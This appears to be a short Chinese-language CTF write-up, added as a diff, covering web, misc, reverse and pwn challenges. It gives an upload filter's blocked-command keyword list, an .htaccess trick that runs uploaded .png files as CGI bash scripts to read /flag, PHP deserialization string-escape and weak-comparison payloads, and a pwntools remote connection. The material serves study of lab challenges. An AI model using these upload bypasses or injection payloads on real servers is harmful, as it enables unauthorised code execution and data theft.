@@ -1,0 +1,60 @@
+web———————————————————————————————————
+easy_upload 上传weevely构造的php，抓包改文件头文件类型。显示perl|pyth|ph|auto|curl|
+base|\|>|rm|ryby|openssl|war|lua|msf|xter|telnet in contents
+搜索发现原题##### curl :https://blog.csdn.net/qq_40648358/article/details/107578239
+》》》》》》》》》》》》
+于是想到了利用cgi执行脚本
+
+先上传一个.htaccess文件，内容是：
+
+AddHandler cgi-script .png
+在 AddHandler 中添加 .png 后缀，这样我们就可以访问 .png 结尾的文件
+然后上传一个后缀为png的文件，内容是
+#! /bin/bash
+echo "Content-Type: text/html"
+echo 
+echo "rdd"
+cat /flag
+访问文件获得flag
+《《《《《《《《《《《《
+
+easyunserialize     了解到反序列化话，从这篇文章学到这次的漏洞利用
+curl :https://www.cnblogs.com/litlife/p/11690918.html
+先创建对象后序列化，在进行过滤转义。过滤转义后，会导致字符变长变短使结果非常
+利用这个漏洞，在构造序列化的时候去闭合注入。
+先构造想要的序列化结果：
+$uname='O:1:"a":2:{s:5:"uname";s:1:"a";s:8:"password";s:4:"easy";}';
+利用替换字符，把uname 的值换成8* challenge";s:8:"password";s:4:"easy";}
+function filter($string){
+    return str_replace('challenge','easychallenge',$string);
+函数会吧challenge扩成有四个可利用空间，payload需要29个
+现在payload还多3个位置需要填补  “}}}“填上
+获得flag
+
+
+easyphp           同样的反序列化题目,加上弱比较
+php弱比较，bool和任何字符串都相等。构造username 和password
+$data = 'a:2:{s:8:"username";b:1;s:8:"password";b:1;}';
+通过post提交
+获得flag
+
+misc——————————————————————————————————
+baba_is_you hexdump查看图片信息，最后一行是b站网址，打开评论有flag
+
+爷的历险记  在文件夹grep -i -r flag ./ 找到很多无用信息，换成搜索unctf找到flag
+
+ez_image
+montage *.jpg -geometry +0+0+0 ok.jpg
+gaps --image=ok.jpg --generations=40 --population=120 --size=60
+获得flag
+
+
+撕坏的二维码
+二维码定位符的修复
+扫码flag
+reverse———————————————————————————————
+re_checkin  x64dbg搜索badboy信息，发现goodboy就在旁边，猜测逻辑判断就在上面，发现flag
+
+
+Pwn———————————————————————————————————
+YLBNB       from pwn import *  r=remote('45.158.33.12',8000) r.interactive() 
